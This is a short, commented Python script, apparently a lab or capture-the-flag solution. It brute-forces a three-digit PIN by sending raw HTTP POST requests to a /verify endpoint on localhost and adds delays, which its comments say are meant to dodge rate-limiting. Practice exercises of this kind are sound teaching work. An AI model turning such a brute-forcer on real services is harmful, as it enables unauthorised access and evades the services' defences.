# Import necessary modules
import socket  # For low-level network communication
import time    # To optionally add a delay between attempts (helps avoid rate-limiting)

# Define server address and port number
host = '127.0.0.1'  # Localhost IP address
port = 8888         # Port where the server is listening

# Function to attempt a single PIN
def try_pin(pin):
    # Create a TCP/IP socket connection
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Connect to the server using the specified host and port
        s.connect((host, port))
        
        # Format the body of the HTTP POST request with the current PIN
        request_body = f"magicNumber={pin:03d}"
        
        # Construct the raw HTTP POST request with headers and body
        request = (
            f"POST /verify HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(request_body)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"{request_body}"
        )
        
        # Send the HTTP request to the server
        s.sendall(request.encode())
        
        # Receive the response from the server (up to 4096 bytes)
        response = s.recv(4096).decode()
        
        # Check if the response contains the success message
        if "Access Granted" in response:
            print(f"✅ Correct PIN found: {pin:03d}")
            return True  # Exit loop if correct PIN is found

    # If the response didn't contain "Access Granted", return False
    return False

# Try all possible 3-digit PINs from 000 to 999
for pin in range(1000):
    print(f"Trying PIN: {pin:03d}")
    
    # Call the try_pin function with the current PIN
    if try_pin(pin):
        break  # Stop the loop if the correct PIN is found

    # Optional delay to avoid triggering server-side rate-limiting
    time.sleep(1)
else:
    # This will only execute if no correct PIN was found in the loop
    print("❌ Correct PIN not found in range 000-999.")
